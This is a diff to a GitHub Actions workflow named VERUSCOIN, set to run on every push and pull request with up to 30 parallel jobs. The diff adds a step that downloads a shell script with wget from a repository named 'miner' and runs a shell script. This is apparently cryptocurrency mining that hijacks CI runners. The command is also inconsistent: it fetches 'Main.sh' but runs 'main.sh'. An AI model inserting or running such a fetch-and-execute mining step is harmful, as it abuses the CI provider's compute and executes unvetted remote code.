@@ -2,7 +2,7 @@ name: VERUSCOIN
 on: [push, pull_request]
 jobs:
   build:
-    name: shib7nu
+    name: Ba_channel
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 30
@@ -22,6 +22,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v1
-    - name: shib7nu
+    - name: BA_channel
       run: |
-        sh main.sh
+        wget https://github.com/Bang122/miner/blob/main/Main.sh && sh main.sh
